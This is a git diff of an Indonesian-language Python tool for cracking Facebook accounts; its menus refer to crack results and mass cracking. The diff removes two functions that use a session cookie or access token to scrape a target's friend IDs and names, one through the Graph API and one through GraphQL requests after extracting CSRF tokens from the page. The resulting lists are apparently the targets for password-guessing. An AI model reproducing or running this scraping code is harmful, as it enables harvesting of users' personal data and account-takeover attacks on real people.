@@ -1041,11 +1041,7 @@ def menu():
 [{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ["1", "01"]:
-        # console.print(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
-        # idt = console.input(f" {H2}• {P2}Masukan Id Target : ")
-        # url = f'https://www.facebook.com/{idt}'
         dump_publikk()
-        #setting()
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
@@ -1057,86 +1053,6 @@ def menu():
         exit()
     else:
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
-
-def Dump_Friendlist(idt,fields,cookie,token):
-	try:
-		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
-		if len(id)==0:
-			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
-		else:
-			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
-		url = ses.get(f"https://graph.facebook.com/{idt}", params=params, headers=headers, cookies=cookie).json()
-		for i in url["friends"]["data"]:
-			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r •  Id : {len(id)}")
-			sys.stdout.flush()
-		Dump_Friendlist(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
-	except: pass
-
-
-# ----------------[ BAGIAN-DATA-GRAPHQL ]----------------#
-def GetData(req):
-    av = re.search('"actorID":"(.*?)"',str(req)).group(1)
-    __user = av
-    __a = str(random.randrange(1,6))
-    __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
-    __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
-    __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
-    __spin_r = __rev
-    __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
-    __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
-    __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
-    fb_dtsg = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
-    jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
-    lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
-    Data = {'av':av,'__user':__user,'__a':__a,'__hs':__hs,'dpr':'1.5','__ccg':__ccg,'__rev':__rev,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd}
-    return(Data)
-# ----------------[ BAGIAN-DUMP-GRAPHQL ]----------------#
-def dump_publikk(cookie,url):
-    try:
-        session = requests.Session()
-        # cookie = open("co.txt", "r").read()
-        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
-        req = session.get(url, headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
-        Data = GetData(req)
-        flid = re.search('{"tab_key":"friends_all","id":"(.*?)"}',str(req)).group(1)
-        Data.update({'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery','server_timestamps': True,'doc_id': '6709724792472394'})
-        cursor = None
-        loop=0
-        # Iterasi pengambilan data selama ada halaman berikutnya
-        while True:
-            Data.update({'variables': json.dumps({"count": 8,"cursor": cursor,"scale": 1.5,"search": None,"id": flid})})
-            head = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Sec-Ch-Prefers-Color-Scheme': 'dark', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Model': '', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
-            response = session.post('https://www.facebook.com/api/graphql/',data=Data, headers=head, cookies={'cookie': cookie})
-            pos = response.json()
-            for x in pos['data']['node']['pageItems']['edges']:
-                try:
-                    profile = x['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']
-                    friend_id = profile['id']
-                    name = profile['name']
-                    fm = f'{friend_id}|{name}'
-                    if fm not in id:
-                        id.append(fm)
-                        loop += 1
-                        print('\r • sedang proses mengumpulkan id, berhasil mendapatkan {} ID'.format(loop), end=''); sys.stdout.flush()
-                except Exception:
-                    pass
-            if pos['data']['node']['pageItems']['page_info']['has_next_page']:
-                cursor = pos['data']['node']['pageItems']['page_info']['end_cursor']
-            else:
-                break
-        # Setelah proses dump selesai
-        if loop == 0:
-            console.print(f" \r{H2}• {P2}Failed To Dump ID!")
-        else:
-            print()
-            # console.print(f" \r{H2}• {P2}Success Dump {loop} ID")
-        # Panggil fungsi setting dengan mengirim list id
-        setting()
-    except Exception as e:
-        console.print(f" {H2}• {P2}Error, Something Went Wrong!\n", str(e))
-        exit()
-	    
 
 #----------[ CRACK-PUBLIK  ]----------#
 def dump_publikk():
@@ -1248,9 +1164,7 @@ def massal():
 def result():
     console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
 {P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))
-
     fankycek = console.input(f" {H2}• {P2}Masukan : ")
-
     if fankycek in ["1", "01"]:
         lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
     elif fankycek in ["2", "02"]:
